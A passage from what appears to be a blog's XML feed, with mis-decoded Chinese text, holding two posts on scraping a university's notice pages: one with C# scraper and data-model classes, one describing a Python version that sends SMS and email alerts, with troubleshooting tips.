<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡_Javaè¯­è¨€_ç¿æº</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨C#çˆ¬è™«çˆ¬å–æ ¡å›­æœ€æ–°é€šçŸ¥</title>
    <url>/posts/976598171/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‰å‡ ä¸ªæœˆç”¨Pythonå†™äº†ä¸€ä¸ªçˆ¬è™«ï¼Œç”¨äºçˆ¬å–æ ¡å›­æœ€æ–°é€šçŸ¥ã€‚æœ€è¿‘çš„C#è¯¾ç¨‹è®¾è®¡ä¸­æƒ³å®ç°åŒæ ·çš„åŠŸèƒ½ï¼Œäºæ˜¯æŒ‰ç…§ä¹‹å‰Pythonä»£ç çš„æ€è·¯é‡æ„äº†ä¸€ä¸‹ã€‚<br><a href="https://zhaoqi99.github.io/45013.html">ç”¨Pythonå®ç°æ ¡å›­é€šçŸ¥æ›´æ–°æé†’</a></p>
<span id="more"></span>

<h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>ä½¿ç”¨C#ä¸­çš„HttpWebRequeståº“å»è·å–ç›®æ ‡url(å„ä¸ªç½‘ç«™çš„â€™æ›´å¤šé€šçŸ¥â€™é¡µ)çš„æºä»£ç ï¼Œç„¶åä½¿ç”¨<code> System.Text.RegularExpressions;</code>è¿›è¡Œæ­£åˆ™åŒ¹é…ã€‚<br>æ­£åˆ™è¡¨è¾¾å¼åº”åŒ…å«ä¸‰ä¸ªåˆ†ç»„:æ—¥æœŸã€æ ‡é¢˜ã€é“¾æ¥ï¼›</p>
<h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><ul>
<li>å‘½åç©ºé—´å¯¼å…¥<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Text.RegularExpressions;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="æºä»£ç "><a href="#æºä»£ç " class="headerlink" title="æºä»£ç "></a>æºä»£ç </h2><p>SpideråŸºç±»:</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Spider</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> url = <span class="built_in">string</span>.Empty;<span class="comment">//è¦çˆ¬å–çš„ç½‘é¡µçš„url</span></span><br><span class="line">    <span class="keyword">public</span> HttpWebRequest request;</span><br><span class="line">    <span class="keyword">public</span> HttpWebResponse response;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> encode = <span class="string">&quot;UTF-8&quot;</span>;<span class="comment">//ç›®æ ‡urlçš„ç½‘é¡µç¼–ç æ ¼å¼</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Method = <span class="built_in">string</span>.Empty;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Url</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">get</span> &#123; <span class="keyword">return</span> url; &#125;</span><br><span class="line">        <span class="keyword">set</span></span><br><span class="line">        &#123;</span><br><span class="line">            url = <span class="keyword">value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Encode</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">get</span> &#123; <span class="keyword">return</span> encode; &#125;</span><br><span class="line">        <span class="keyword">set</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">value</span> == <span class="string">&quot;UTF-8&quot;</span> || <span class="keyword">value</span> == <span class="string">&quot;GBK&quot;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                encode = <span class="keyword">value</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//Todo:handle exception</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Spider</span>(<span class="params"><span class="built_in">string</span> url,<span class="built_in">string</span> method</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.url = url;</span><br><span class="line">        <span class="keyword">this</span>.Method = method;</span><br><span class="line">        Create();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Spider</span>()</span> &#123; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Create</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        request = (HttpWebRequest)WebRequest.Create(url);</span><br><span class="line">        request.Method = Method;</span><br><span class="line">        request.Credentials = CredentialCache.DefaultCredentials;</span><br><span class="line">        request.UserAgent = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è·å–ç›®æ ‡urlçš„Htmlä»£ç </span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">string</span> <span class="title">getHtml</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> reader = <span class="built_in">string</span>.Empty;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            Create();</span><br><span class="line">            response = (HttpWebResponse)request.GetResponse();</span><br><span class="line">            <span class="keyword">if</span> (response.StatusCode == HttpStatusCode.OK)</span><br><span class="line">            &#123;</span><br><span class="line">                StreamReader sr = <span class="keyword">new</span> StreamReader(response.GetResponseStream(), Encoding.GetEncoding(encode));</span><br><span class="line">                reader = sr.ReadToEnd();</span><br><span class="line">                sr.Close();</span><br><span class="line">                response.Close();<span class="comment">//å…³é—­responseå“åº”æµ</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            Log.Write( e.Message, <span class="string">&quot;Exception&quot;</span>);</span><br><span class="line">            MessageBox.Show(e.Message, <span class="string">&quot;é”™è¯¯&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> reader;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>SpiderNoticeç±»:</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">SpiderNotice</span> : <span class="title">Spider</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> url_main;<span class="comment">//å„ä¸ªé€šçŸ¥é“¾æ¥çš„å…¬å…±éƒ¨åˆ†</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> department;<span class="comment">//æ‰€å±éƒ¨é—¨</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> type;<span class="comment">//é€šçŸ¥ç±»å‹</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> pattern;<span class="comment">//ç”¨äºåŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼è§„åˆ™</span></span><br><span class="line">    <span class="keyword">private</span> ArrayList all_notice = <span class="keyword">new</span> ArrayList();<span class="comment">//æ‰€æœ‰çš„é€šçŸ¥</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> parse = <span class="built_in">string</span>.Empty;<span class="comment">//æ—¥æœŸçš„è§£æè§„åˆ™</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SpiderNotice</span>(<span class="params"><span class="built_in">string</span> url, <span class="built_in">string</span> pattern, <span class="built_in">string</span> url_main, <span class="built_in">string</span> department, <span class="built_in">string</span> type</span>) : <span class="title">base</span>(<span class="params">url, <span class="string">&quot;GET&quot;</span></span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.department = department;</span><br><span class="line">        <span class="keyword">this</span>.pattern = pattern;</span><br><span class="line">        <span class="keyword">this</span>.url_main = url_main;</span><br><span class="line">        <span class="keyword">this</span>.type = type;</span><br><span class="line">        <span class="keyword">this</span>.parse = <span class="string">&quot;yyyy-MM-dd&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Get</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        all_notice.Clear();</span><br><span class="line">        Regex r = <span class="keyword">new</span> Regex(pattern, RegexOptions.ExplicitCapture);</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">string</span> s = getHtml();</span><br><span class="line">            <span class="keyword">if</span> (s == <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentNullException(<span class="string">&quot;html&quot;</span>);</span><br><span class="line">            MatchCollection mc = r.Matches(s);</span><br><span class="line">            <span class="keyword">foreach</span> (Match m <span class="keyword">in</span> mc)</span><br><span class="line">            &#123;</span><br><span class="line">                GroupCollection <span class="keyword">group</span> = m.Groups;</span><br><span class="line">                DateTime date = DateTime.ParseExact(<span class="keyword">group</span>[<span class="string">&quot;date&quot;</span>].Value, parse, System.Globalization.CultureInfo.InstalledUICulture);</span><br><span class="line">                <span class="built_in">string</span> link = url_main + <span class="keyword">group</span>[<span class="string">&quot;link&quot;</span>].Value;</span><br><span class="line">                Notice n = <span class="keyword">new</span> Notice();</span><br><span class="line">                n.Title = <span class="keyword">group</span>[<span class="string">&quot;title&quot;</span>].Value;</span><br><span class="line">                n.Link = link;</span><br><span class="line">                n.Date = date;</span><br><span class="line">                n.Department = department;</span><br><span class="line">                n.Type = type;</span><br><span class="line">                all_notice.Add(n);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            BLL.Log.Write(e.Message, <span class="string">&quot;Exception&quot;</span>);</span><br><span class="line">            MessageBox.Show(e.Message, <span class="string">&quot;é”™è¯¯&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Notice <span class="title">index</span>(<span class="params"><span class="built_in">int</span> index</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= all_notice.Count)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IndexOutOfRangeException();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> all_notice[index] <span class="keyword">as</span> Notice;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Notice[] <span class="title">GetAll</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Notice[] All = <span class="keyword">new</span> Notice[all_notice.Count];</span><br><span class="line">        <span class="built_in">int</span> flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="built_in">object</span> t <span class="keyword">in</span> all_notice)</span><br><span class="line">        &#123;</span><br><span class="line">            All[flag++] = t <span class="keyword">as</span> Notice;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> All;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">int</span> <span class="title">Count</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> all_notice.Count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ•°æ®æ¨¡å‹Noticeç±»:</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Notice</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">region</span> æ•°æ®æ¨¡å‹</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> title=<span class="built_in">string</span>.Empty;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> link=<span class="built_in">string</span>.Empty;</span><br><span class="line">    <span class="keyword">private</span> DateTime date=DateTime.Now;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> type=<span class="built_in">string</span>.Empty;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> department=<span class="built_in">string</span>.Empty;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Title</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">get</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> title;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">set</span></span><br><span class="line">        &#123;</span><br><span class="line">            title = <span class="keyword">value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> DateTime Date</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">get</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> date;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">set</span></span><br><span class="line">        &#123;</span><br><span class="line">            date = <span class="keyword">value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Link</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">set</span></span><br><span class="line">        &#123;</span><br><span class="line">            link = <span class="keyword">value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">get</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> link;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Type</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">get</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> type;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">set</span></span><br><span class="line">        &#123;</span><br><span class="line">            type = <span class="keyword">value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Department</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">get</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> department;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">set</span></span><br><span class="line">        &#123;</span><br><span class="line">            department = <span class="keyword">value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#<span class="keyword">endregion</span></span></span><br><span class="line">    <span class="function"><span class="keyword">override</span> <span class="keyword">public</span> <span class="built_in">string</span> <span class="title">ToString</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">string</span>.Format(<span class="string">&quot;æ ‡é¢˜:&#123;0&#125;\næ—¶é—´:&#123;1&#125;\né“¾æ¥:&#123;2&#125;\n&quot;</span>, title, date.ToString(<span class="string">&quot;yyyy-MM-dd&quot;</span>), link);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="é—®é¢˜æ€»ç»“"><a href="#é—®é¢˜æ€»ç»“" class="headerlink" title="é—®é¢˜æ€»ç»“"></a>é—®é¢˜æ€»ç»“</h2><ul>
<li>ä»ä¸åŒç½‘ç«™ä¸Šçˆ¬å–åˆ°çš„æ—¥æœŸæ ¼å¼å¯èƒ½ä¸åŒï¼Œä¸ºç»Ÿä¸€æ ¼å¼ï¼Œå¯ä»¥ä½¿ç”¨ï½€DateTime.ParseExact(datastr, parse, System.Globalization.CultureInfo.InstalledUICulture);ï½€å»è§£æç”¨äºè¡¨ç¤ºæ—¥æœŸçš„å­—ç¬¦ä¸²ï¼Œç„¶åå†è½¬ä¸ºç»Ÿä¸€æ—¥æœŸæ ¼å¼çš„å­—ç¬¦ä¸²ã€‚å…¶ä¸­ï¼Œdatasträ¸ºè¡¨ç¤ºæ—¥æœŸçš„å­—ç¬¦ä¸²ï¼Œparseä¸ºè§£æè§„åˆ™ã€‚ä¾‹:<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> parse=<span class="string">&quot;yyyy-M-D&quot;</span>;</span><br><span class="line">DateTime t=DateTime.ParseExact(<span class="string">&quot;2016-9-5&quot;</span>, parse, System.Globalization.CultureInfo.InstalledUICulture);</span><br><span class="line"><span class="built_in">string</span> str=t.toString(<span class="string">&quot;yyyy-MM-dd&quot;</span>);<span class="comment">//2016-09-05</span></span><br></pre></td></tr></table></figure></li>
<li>ä¸ç”¨ç½‘é¡µçš„ç½‘é¡µç¼–ç æ ¼å¼å¯èƒ½ä¸åŒï¼Œæœ‰çš„ä¸ºGBK,æœ‰çš„é—®UTF-8;</li>
<li>ç”¨å­—ç¬¦ä¸²å»è¡¨è¾¾æ­£åˆ™è¡¨è¾¾å¼çš„è§„åˆ™æ—¶ï¼Œæœ‰ä¸¤ç§æ–¹æ³•:<ol>
<li>string s&#x3D;@&quot;\d+&quot;&quot;&quot;;å­—ç¬¦ä¸²å‰åŠ @è¡¨ç¤ºå­—ç¬¦ä¸²æŒ‰å¸¸é‡è§£æ(æ³¨æ„:åŒå¼•å·ç”¨ä¸¤ä¸ªåŒå¼•å·æ¥è¡¨ç¤º)</li>
<li>string s&#x3D;&quot;\d+&quot;&quot;;ä½¿ç”¨è½¬ä¹‰ç¬¦</li>
</ol>
</li>
</ul>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>C#</category>
      </categories>
      <tags>
        <tag>C#</tag>
        <tag>çˆ¬è™«</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨Pythonå®ç°æ ¡å›­é€šçŸ¥æ›´æ–°æé†’</title>
    <url>/posts/45013/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™ä¸ªé¡¹ç›®å®å·²ç»åœ¨ä¸€ä¸ªæœˆå‰å·²ç»å®Œæˆäº†ï¼Œä¸€ç›´éƒ½æƒ³å†™ä¸€ç¯‡åšå®¢æ¥æ€»ç»“è¿™ä¸ªè¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€äº›é—®é¢˜ã€‚ä½†æœ€è¿‘ä¸€ä¸ªæœˆæ¥éƒ½æ¯”è¾ƒå¿™ï¼Œæ‰€ä»¥ä¸€ç›´æ‹–åˆ°äº†ç°åœ¨ã€‚<br>é¦–å…ˆè¯´è¯´èµ·å› å§ï¼Œæˆ‘æ²¡äº‹çš„æ—¶å€™ï¼Œæ€»å–œæ¬¢ä¾æ¬¡ç‚¹å¼€å­¦æ ¡ä¸»é¡µã€æ•™åŠ¡å¤„ã€å›¾ä¹¦é¦†ä»¥åŠå­¦é™¢çš„ç½‘ç«™ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆæ–°é€šçŸ¥ï¼Œè™½ç„¶å¤§å¤šä¸æˆ‘æ— å…³ã€‚æ°é€¢æœ€è¿‘æ­£åœ¨å­¦Pythonï¼Œç»å¸¸å¬åˆ°åˆ«äººè¯´ç”¨Pythonå†™çˆ¬è™«å¾ˆç®€å•ï¼Œä½†è‡ªå·±å°šæœªæ¥è§¦è¿‡çˆ¬è™«ã€‚äºæ˜¯æŠ±ç€è¯•ä¸€è¯•çš„å¿ƒæ€çœ‹äº†å‡ ç¯‡å…³äºPythonçˆ¬è™«çš„åšå®¢ï¼Œå‘ç°å®ç°èµ·æ¥çš„ç¡®å¾ˆç®€å•ã€‚äºæ˜¯ï¼Œä¾¿ä¸€è¾¹çœ‹ç€å®˜æ–¹çš„æ–‡æ¡£è¯´æ˜ï¼Œä¸€è¾¹çœ‹ç€åˆ«äººçš„åšå®¢ï¼Œç»ˆäºå®Œæˆäº†è‡ªå·±çš„ç¬¬ä¸€æ¬¡çˆ¬è™«ã€‚</p>
<span id="more"></span>

<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>ä½¿ç”¨<code>urllib.request</code>åº“è·å–åˆ°ç›®æ ‡url(å„ä¸ªç½‘ç«™çš„&#39;æ›´å¤šé€šçŸ¥&#39;é¡µ)çš„æºä»£ç ï¼Œç„¶ååˆ©ç”¨Pythonçš„<code>re</code>åº“è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œæå–åˆ°é€šçŸ¥ç›¸å…³ä¿¡æ¯åï¼Œä¸æ–‡ä»¶ä¸­å­˜å–çš„ä¸Šä¸€æ¬¡çˆ¬å–åˆ°çš„ä¿¡æ¯è¿›è¡Œå¯¹æ¯”ã€‚<br>è‹¥æ£€æµ‹åˆ°æœ‰æ–°çš„é€šçŸ¥ï¼Œåˆ™åˆ©ç”¨<code>twilio</code>åº“å‘æŒ‡å®šæ‰‹æœºå·ç å‘é€SMSï¼Œåˆ©ç”¨<code>smtplib</code>åº“å‘æŒ‡å®šé‚®ç®±å‘é€æé†’ä¿¡æ¯ã€‚<br>æ­¤å¤–ï¼Œè¿˜å…·æœ‰å‘é€æ—¥å¿—ä»¥åŠå¼‚å¸¸æ—¥å¿—çš„åŠŸèƒ½ã€‚<br>ç›®å‰ä»…æ”¯æŒæœ¬æ ¡çš„é€šçŸ¥æé†’ï¼Œåç»­ä¼šé€æ­¥æé«˜é¡¹ç›®çš„é€šç”¨æ€§ã€‚</p>
<h2 id="æºç ï¼š"><a href="#æºç ï¼š" class="headerlink" title="æºç ï¼š"></a>æºç ï¼š</h2><p>Githubåœ°å€:<a href="https://github.com/ZhaoQi99/School_Notice">School_Notice</a></p>
<h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><ul>
<li>å®‰è£…twilioåº“:<code>pip install twilio</code></li>
<li>æ³¨å†Œtwilioè´¦å·:<a href="https://www.twilio.com/">Twilio</a></li>
<li>éªŒè¯æ‰‹æœºå·:ç”¨æ¥æ¥æ”¶çŸ­ä¿¡æé†’çš„å·ç å¿…é¡»åœ¨twilioä¸Šè¿›è¡ŒéªŒè¯</li>
</ul>
<h2 id="é‡åˆ°çš„é—®é¢˜"><a href="#é‡åˆ°çš„é—®é¢˜" class="headerlink" title="é‡åˆ°çš„é—®é¢˜"></a>é‡åˆ°çš„é—®é¢˜</h2><h3 id="é‚®ä»¶å‘é€"><a href="#é‚®ä»¶å‘é€" class="headerlink" title="é‚®ä»¶å‘é€"></a>é‚®ä»¶å‘é€</h3><ul>
<li>è‹¥ç”¨åä¸ºmsgçš„å˜é‡æ¥ä¿å­˜é‚®ä»¶æ–‡æœ¬ï¼Œåˆ™<code>msg[&#39;From&#39;]</code>ä»¥åŠ<code>msg[&#39;To&#39;]</code>å¿…é¡»ä¸ºå®é™…çš„å‘ä»¶äººåœ°å€ï¼Œå¦åˆ™å¯èƒ½ä¼šå‡ºç°å¼‚å¸¸:<code>SMTPDataError(code, resp)</code>.å¦‚å¿…é¡»å†™ä½œ:<code>msg[&#39;From&#39;] = &#39;xxxxx@qq.com&#39;</code>.æˆ‘æ˜¯ä½¿ç”¨çš„QQé‚®ç®±æ¥å‘é‚®ä»¶ï¼Œè‡³äºå…¶ä»–é‚®ç®±éœ€ä¸éœ€è¦è¿™æ ·å†™è¿˜ä¸æ¸…æ¥šã€‚ </li>
<li>åŸæœ¬æƒ³ç”¨ä¸€ä¸ªforå¾ªç¯æ¥å®ç°å¤šäººå‘é€ï¼Œåæ¥å‘ç°smtplibåº“çš„sendmailæ–¹æ³•æ”¯æŒå¤šäººå‘é€ï¼Œä½†å‚æ•°åº”ä¸ºä¸€ä¸ªlistï¼Œæ•…å¯ç”¨<code>str.split(&#39;,&#39;)</code>å°†å­—ç¬¦ä¸²è½¬ä¸ºlistã€‚</li>
<li>æˆ‘ä½¿ç”¨çš„æ˜¯Windowsä¸‹çš„Pythonï¼Œè‹¥è®¡ç®—æœºåä¸ºä¸­æ–‡ï¼Œåˆ™æœ‰å¯èƒ½ä¼šå¯¼è‡´å‡ºç°å¼‚å¸¸ï¼Œå¯é€šè¿‡å³å‡»æ­¤ç”µè„‘-&gt;å±æ€§ï¼Œä¿®æ”¹è®¡ç®—æœºåã€‚</li>
<li>ç¨‹åºä»£ç ä¸­ä½¿ç”¨çš„é‚®ç®±å¯†ç ä¸æ˜¯QQå¯†ç ï¼Œåº”åœ¨é‚®ç®±è®¾ç½®-&gt;è´¦æˆ·-&gt;SMTPæœåŠ¡å¤„ï¼Œè·å–æˆæƒç ã€‚</li>
</ul>
<h3 id="å…¶ä»–é—®é¢˜"><a href="#å…¶ä»–é—®é¢˜" class="headerlink" title="å…¶ä»–é—®é¢˜"></a>å…¶ä»–é—®é¢˜</h3><ul>
<li>æœ‰æ—¶å€™ä¼šæ¥æ”¶ä¸åˆ°Twilioå‘é€çš„çŸ­ä¿¡ï¼Œç»™10086æ‰“ç”µè¯ä¹Ÿæ²¡é—®å‡ºä¸ªæ‰€ä»¥ç„¶ï¼Œå¯èƒ½æ˜¯å› ä¸ºçŸ­ä¿¡ä¸­æœ‰æ•æ„Ÿè¯(å¦‚:å­¦æ ¡å)ï¼Œä¿®æ”¹çŸ­ä¿¡å†…å®¹åå°±å¯ä»¥äº†</li>
<li>å¯¹ä¸Šè¿°å‡ ä¸ªç½‘ç«™çš„æºç ä½¿ç”¨<code>re.findall</code>åè¿”å›çš„åˆ—è¡¨ä¸­çš„æ¯ä¸ªå…ƒç»„ä¸­çš„å…ƒç´ çš„é¡ºåºå‡ä¸ºæ—¶é—´ã€æ ‡é¢˜ã€é“¾æ¥ï¼Œä½†å¯¹å­¦ç”Ÿå¤„ç½‘ç«™çš„æºç æ­£åˆ™åŒ¹é…åçš„å…ƒç´ é¡ºåºå¹¶ä¸æ˜¯æŒ‰ç…§ä¸Šè¿°é¡ºåºçš„ã€‚æ‰€ä»¥åº”å•ç‹¬è¿›è¡Œè°ƒæ•´ï¼Œä½†ç›´æ¥ä¿®æ”¹ä¸€ä¸ªå…ƒç»„ä¸­çš„å…ƒç´ ï¼Œä¼šå‡ºç°å¼‚å¸¸:<code>error:tuple&#39; object does not support item assignment</code>ã€‚è§£å†³æ–¹æ³•æ˜¯:<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(subject_EN == <span class="string">&#x27;snnu_xsc&#x27;</span>):</span><br><span class="line">	new_data = []</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> data:</span><br><span class="line">		temp = (item[<span class="number">1</span>], item[<span class="number">2</span>], item[<span class="number">0</span>])</span><br><span class="line">        new_data.append(temp)</span><br><span class="line">    data = new_data</span><br></pre></td></tr></table></figure></li>
<li>Python3ä¸­çš„printå‡½æ•°æ˜¯è‡ªåŠ¨æ¢è¡Œçš„ï¼Œè‹¥ä¸éœ€è¦è‡ªåŠ¨æ¢è¡Œï¼Œåˆ™å¯å†™ä½œ:<code>print(str,end=&#39;&#39;)</code></li>
<li>ä¸åŒç½‘ç«™çš„ç¼–ç æ ¼å¼å¯èƒ½ä¸åŒï¼Œåº”æŒ‰ç…§å„è‡ªçš„ç¼–ç æ–¹å¼è¿›è¡Œè§£ç ã€‚è‹¥å‡é‡‡ç”¨<code>utf-8</code>çš„æ–¹å¼ï¼Œåˆ™å¯èƒ½ä¼šå‡ºç°å„ç§ç¼–ç é—®é¢˜ï¼Œå¦‚:<div class="note danger"><p>UnicodeDecodeError: 'utf-8' codec can't decode byte 0xc9 in position 167
</p></div>
è§£å†³æ–¹æ³•æ˜¯:
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> find1 == -<span class="number">1</span> &amp; find2 == -<span class="number">1</span>:</span><br><span class="line">	Coding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="comment"># æ•™åŠ¡å¤„ç½‘é¡µæºç ç¼–ç æ ¼å¼ä¸ºä¸ºgbk</span></span><br><span class="line">	<span class="comment"># å­¦ç”Ÿå¤„ç½‘é¡µæºç ç¼–ç æ ¼å¼ä¸ºgb2312</span></span><br><span class="line">	Coding = <span class="string">&#x27;gbk&#x27;</span></span><br><span class="line">data = response.read().decode(Coding)</span><br></pre></td></tr></table></figure></li>
</ul>
